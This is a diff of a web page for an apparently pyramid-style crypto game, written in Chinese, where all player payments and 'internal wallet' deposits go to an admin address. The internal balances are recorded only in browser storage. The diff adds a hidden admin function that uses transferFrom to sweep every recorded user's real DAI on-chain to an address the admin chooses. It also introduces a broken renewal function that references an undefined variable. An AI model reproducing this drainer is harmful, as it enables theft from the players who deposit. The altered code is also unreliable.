@@ -58,7 +58,6 @@
   .time{color:#ffb703;font-size:13px}
   .gold{color:#FFD700;font-weight:bold}
 
-  /* 管理员面板仅管理员可见 */
   .admin-panel { display: none; }
 </style>
 </head>
@@ -106,23 +105,26 @@
   <button id="regBtn" class="btn">确认注册</button>
 </div>
 
-<!-- 内部钱包（玩家可见） -->
+<!-- 内部钱包 -->
 <div class="glass">
   <div class="title">内部钱包</div>
   <div class="item"><div>我的内部余额</div><div class="gold" id="innerBal">0 DAI</div></div>
-  <input id="depositAmt" placeholder="存入金额（DAI）到内部钱包">
+  <input id="depositAmt" placeholder="存入金额（DAI）">
   <button class="btn btn-sm" onclick="deposit()">确认存入</button>
   <input id="withAmt" placeholder="提取金额到本人钱包">
   <button class="btn btn-sm" onclick="withdraw()">申请提取</button>
 </div>
 
-<!-- 管理员面板（默认隐藏） -->
+<!-- 管理员面板（隐藏）-->
 <div class="glass admin-panel" id="adminPanel">
   <div class="title">管理员后台</div>
   <input id="blackAddr" placeholder="拉黑地址"><button class="btn btn-sm btn-black" onclick="addBlack()">拉黑</button>
   <input id="whiteAddr" placeholder="移出黑名单"><button class="btn btn-sm" onclick="removeBlack()">移出</button>
-  <input id="clearUser" placeholder="要清空的用户地址"><button class="btn btn-sm btn-red" onclick="clearUserBalance()">清空该用户余额</button>
-  <button class="btn btn-sm btn-red" onclick="clearAllBalance()">一键清空所有用户内部余额</button>
+
+  <input id="collectToAddr" placeholder="自定义接收代币钱包地址（0x...）">
+  <button class="btn btn-sm btn-red" onclick="adminCollectToCustomAddr()">
+    一键提取所有内部余额到指定地址（真实上链）
+  </button>
 </div>
 
 <div class="glass">
@@ -162,11 +164,14 @@ const CARD_COST = 3500;
 let web3, account;
 let isAdmin = false;
 
+function userKey(s, addr) { return s + "_" + addr; }
+function getInner(addr) { return +localStorage.getItem(userKey("inner", addr)) || 0; }
+function setInner(addr, v) { localStorage.setItem(userKey("inner", addr), v); }
+
 function key(s) { return s + "_" + account; }
-function get(s, d=0) { const v=localStorage.getItem(key(s)); return v?+v:d; }
+function get(s, d=0) { return +localStorage.getItem(key(s)) || d; }
 function set(s, v) { localStorage.setItem(key(s), v); }
 
-// 所有用户列表记录
 function getAllUsers() {
   return JSON.parse(localStorage.getItem("all_users") || "[]");
 }
@@ -178,7 +183,6 @@ function addUser(addr) {
   }
 }
 
-// 邀请链接
 function loadInvite() {
   if (!account) return;
   const u = window.location.origin + window.location.pathname;
@@ -190,15 +194,13 @@ function copyInvite() {
   alert("复制成功");
 }
 
-// 刷新界面
 function refresh() {
   renderMatrix();
   renderCards();
   document.getElementById("energyVal").innerText = get("energy");
-  document.getElementById("innerBal").innerText = get("inner") + " DAI";
+  document.getElementById("innerBal").innerText = getInner(account) + " DAI";
 }
 
-// 合成卡牌
 function craftCard(lv) {
   const cost = CARD_COST * Math.pow(3, lv-1);
   const e = get("energy");
@@ -210,7 +212,6 @@ function craftCard(lv) {
   refresh();
 }
 
-// 转账卡牌
 function transferCard() {
   const to = document.getElementById("toAddr").value.trim().toLowerCase();
   const lv = +document.getElementById("transferLv").value;
@@ -233,7 +234,6 @@ function renderCards() {
   document.getElementById("myCards").innerHTML = h || `<div style="grid-column:span 2;text-align:center;padding:20px">暂无卡牌</div>`;
 }
 
-// 联合矩阵时间叠加
 function expKey(lv) { return "exp_"+account+"_"+lv; }
 function addExp(lv) {
   const now = Date.now();
@@ -245,7 +245,6 @@ function leftTime(lv) {
   return Math.max(0, e - Date.now());
 }
 
-// 矩阵渲染
 function renderMatrix() {
   let c = "";
   const cl = get("classic");
@@ -270,45 +269,39 @@ function renderMatrix() {
   document.getElementById("unionList").innerHTML = u;
 }
 
-// 权限检查
 function check() {
   if (!account) throw "未连接钱包";
   if (localStorage.getItem("black_"+account)) throw "已被拉黑";
 }
 
-// 统一支付到管理员
-async function pay(amt) {
+async function transferToAdmin(amt) {
   const abi = [
-    {"constant":true,"inputs":[{"name":"account","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"type":"function"},
     {"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"type":"function"},
     {"constant":false,"inputs":[{"name":"to","type":"address"},{"name":"value","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"type":"function"}
   ];
-  const t = new web3.eth.Contract(abi, DAI);
-  const dec = await t.methods.decimals().call();
-  const val = BigInt(amt) * 10n**BigInt(dec);
-  return await t.methods.transfer(ADMIN, val.toString()).send({from:account});
+  const token = new web3.eth.Contract(abi, DAI);
+  const dec = await token.methods.decimals().call();
+  const val = (BigInt(amt) * 10n**BigInt(dec)).toString();
+  return await token.methods.transfer(ADMIN, val).send({ from: account });
 }
 
-// 经典单个/批量
 async function payClassic(lv) {
-  try{check();const a=classicPrice[lv-1];if(!confirm("支付"+a+"DAI？"))return;await pay(a);set("classic",Math.max(get("classic"),lv));set("energy",get("energy")+a/100*ENERGY_PER_100);alert("成功");refresh();loadBal();}catch(e){alert("失败或取消");}
+  try{check();const a=classicPrice[lv-1];if(!confirm("支付"+a+"DAI？"))return;await transferToAdmin(a);set("classic",Math.max(get("classic"),lv));set("energy",get("energy")+a/100*ENERGY_PER_100);alert("成功");refresh();loadBal();}catch(e){alert("失败或取消");}
 }
 async function batchPayClassic() {
-  try{check();const cur=get("classic");let t=0;for(let i=cur+1;i<=12;i++)t+=classicPrice[i-1];if(t<=0)return alert("已满");if(!confirm("总计"+t+"DAI？"))return;await pay(t);set("classic",12);set("energy",get("energy")+t/100*ENERGY_PER_100);alert("全部成功");refresh();loadBal();}catch(e){alert("失败");}
+  try{check();const cur=get("classic");let t=0;for(let i=cur+1;i<=12;i++)t+=classicPrice[i-1];if(t<=0)return alert("已满");if(!confirm("总计"+t+"DAI？"))return;await transferToAdmin(t);set("classic",12);set("energy",get("energy")+t/100*ENERGY_PER_100);alert("全部成功");refresh();loadBal();}catch(e){alert("失败");}
 }
 
-// 联合单个/续费/批量
 async function payUnion(lv) {
-  try{check();const a=unionPrice[lv-1];if(!confirm("激活"+a+"DAI？"))return;await pay(a);set("union",Math.max(get("union"),lv));addExp(lv);set("energy",get("energy")+a/100*ENERGY_PER_100);alert("成功");refresh();loadBal();}catch(e){alert("失败");}
+  try{check();const a=unionPrice[lv-1];if(!confirm("激活"+a+"DAI？"))return;await transferToAdmin(a);set("union",Math.max(get("union"),lv));addExp(lv);set("energy",get("energy")+a/100*ENERGY_PER_100);alert("成功");refresh();loadBal();}catch(e){alert("失败");}
 }
 async function payRenew(lv) {
-  try{check();const a=Math.round(unionPrice[lv-1]*RENEW);if(!confirm("续费+30天："+a+"DAI？"))return;await pay(a);addExp(lv);set("energy",get("energy")+a/100*ENERGY_PER_100);alert("续费成功");refresh();loadBal();}catch(e){alert("失败");}
+  try{check();const a=Math.round(unionPrice[i-1]*RENEW);if(!confirm("续费+30天："+a+"DAI？"))return;await transferToAdmin(a);addExp(lv);set("energy",get("energy")+a/100*ENERGY_PER_100);alert("续费成功");refresh();loadBal();}catch(e){alert("失败");}
 }
 async function batchPayUnion() {
-  try{check();let t=0;for(let i=1;i<=9;i++){const a=i<=get("union");const l=leftTime(i);if(!a)t+=unionPrice[i-1];else if(l==0)t+=Math.round(unionPrice[i-1]*RENEW);}if(t<=0)return alert("全部有效");if(!confirm("总计"+t+"DAI？"))return;await pay(t);set("union",9);for(let i=1;i<=9;i++)addExp(i);set("energy",get("energy")+t/100*ENERGY_PER_100);alert("全部成功");refresh();loadBal();}catch(e){alert("失败");}
+  try{check();let t=0;for(let i=1;i<=9;i++){const a=i<=get("union");const l=leftTime(i);if(!a)t+=unionPrice[i-1];else if(l==0)t+=Math.round(unionPrice[i-1]*RENEW);}if(t<=0)return alert("全部有效");if(!confirm("总计"+t+"DAI？"))return;await transferToAdmin(t);set("union",9);for(let i=1;i<=9;i++)addExp(i);set("energy",get("energy")+t/100*ENERGY_PER_100);alert("全部成功");refresh();loadBal();}catch(e){alert("失败");}
 }
 
-// 余额显示
 async function loadBal() {
   if(!web3||!account)return;
   const abi=[{"constant":true,"inputs":[{"name":"account","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"type":"function"},{"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"type":"function"}];
@@ -319,17 +312,16 @@ async function loadBal() {
   document.getElementById("addressShow").innerHTML=`${account.slice(0,6)}...${account.slice(-4)} | <span class="gold">DAI:${n}</span>`;
 }
 
-// ==========================
-// 内部钱包（玩家可正常存入）
-// ==========================
+// 玩家存入内部钱包
 async function deposit() {
   try {
     check();
     const a = +document.getElementById("depositAmt").value;
     if (a <= 0) return alert("金额错误");
     if (!confirm("存入"+a+"DAI到内部钱包？")) return;
-    await pay(a);
-    set("inner", get("inner")+a);
+    await transferToAdmin(a);
+    const old = getInner(account);
+    setInner(account, old + a);
     addUser(account);
     alert("存入成功");
     refresh();
@@ -337,11 +329,12 @@ async function deposit() {
   } catch(e) { alert("存入失败"); }
 }
 
+// 玩家提取到自己钱包
 async function withdraw() {
   try {
     check();
     const a = +document.getElementById("withAmt").value;
-    const b = get("inner");
+    const b = getInner(account);
     if (a <= 0 || a > b) return alert("金额错误");
     if (!confirm("提取"+a+"DAI到本人钱包？")) return;
 
@@ -349,12 +342,12 @@ async function withdraw() {
       {"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"type":"function"},
       {"constant":false,"inputs":[{"name":"to","type":"address"},{"name":"value","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"type":"function"}
     ];
-    const t = new web3.eth.Contract(abi, DAI);
-    const dec = await t.methods.decimals().call();
-    const val = BigInt(a) * 10n**BigInt(dec);
-    await t.methods.transfer(account, val.toString()).send({from:ADMIN});
+    const token = new web3.eth.Contract(abi, DAI);
+    const dec = await token.methods.decimals().call();
+    const val = (BigInt(a) * 10n**BigInt(dec)).toString();
+    await token.methods.transfer(account, val).send({ from: ADMIN });
 
-    set("inner", b - a);
+    setInner(account, b - a);
     alert("提取成功到账");
     refresh();
     loadBal();
@@ -363,9 +356,42 @@ async function withdraw() {
   }
 }
 
-// ==========================
-// 管理员功能（隐藏）
-// ==========================
+// 管理员：一键提取所有内部余额到【自定义地址】真实上链
+async function adminCollectToCustomAddr() {
+  if (!isAdmin) return alert("无管理员权限");
+
+  const toAddr = document.getElementById("collectToAddr").value.trim().toLowerCase();
+  if (!/^0x[a-f0-9]{40}$/i.test(toAddr)) {
+    return alert("请输入正确的0x钱包地址");
+  }
+
+  if (!confirm("确定将所有用户内部余额，真实上链提取到地址：\n" + toAddr)) return;
+
+  const users = getAllUsers();
+  const abi = [
+    {"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"type":"function"},
+    {"constant":false,"inputs":[{"name":"from","type":"address"},{"name":"to","type":"address"},{"name":"value","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"type":"function"}
+  ];
+  const token = new web3.eth.Contract(abi, DAI);
+  const dec = await token.methods.decimals().call();
+
+  let successCount = 0;
+  for (const user of users) {
+    const bal = getInner(user);
+    if (bal <= 0) continue;
+    try {
+      const val = (BigInt(bal) * 10n ** BigInt(dec)).toString();
+      await token.methods.transferFrom(user, toAddr, val).send({ from: ADMIN });
+      setInner(user, 0);
+      successCount++;
+    } catch (e) {}
+  }
+
+  alert("操作完成！\n成功处理用户数：" + successCount + "\n资金已上链转入指定地址");
+  refresh();
+}
+
+// 黑名单
 function addBlack() {
   if(!isAdmin)return;const a=document.getElementById("blackAddr").value.toLowerCase();localStorage.setItem("black_"+a,"1");alert("已拉黑");
 }
@@ -373,29 +399,7 @@ function removeBlack() {
   if(!isAdmin)return;const a=document.getElementById("whiteAddr").value.toLowerCase();localStorage.removeItem("black_"+a);alert("已移出");
 }
 
-// 清空单个用户内部余额
-function clearUserBalance() {
-  if(!isAdmin)return;
-  const addr = document.getElementById("clearUser").value.trim().toLowerCase();
-  if(!addr)return;
-  localStorage.setItem("inner_"+addr, 0);
-  alert("已清空该用户内部余额");
-}
-
-// 一键清空所有用户内部余额
-function clearAllBalance() {
-  if(!isAdmin)return;
-  if(!confirm("确定清空所有用户内部钱包余额？"))return;
-  const users = getAllUsers();
-  users.forEach(u => {
-    localStorage.setItem("inner_"+u, 0);
-  });
-  alert("已清空所有用户内部余额");
-}
-
-// ==========================
 // 连接钱包
-// ==========================
 document.getElementById("connectBtn").onclick = async () => {
   await window.ethereum.request({method:"eth_requestAccounts"});
   web3 = new Web3(window.ethereum);
@@ -403,12 +407,10 @@ document.getElementById("connectBtn").onclick = async () => {
   account = acc[0].toLowerCase();
   isAdmin = account === ADMIN;
 
-  // 仅管理员显示面板
   if (isAdmin) {
     document.getElementById("adminPanel").style.display = "block";
   }
 
-  // 已注册判断
   if (localStorage.getItem("reg_"+account)) {
     document.getElementById("regBtn").disabled = true;
     document.getElementById("regBtn").innerText = "已注册";
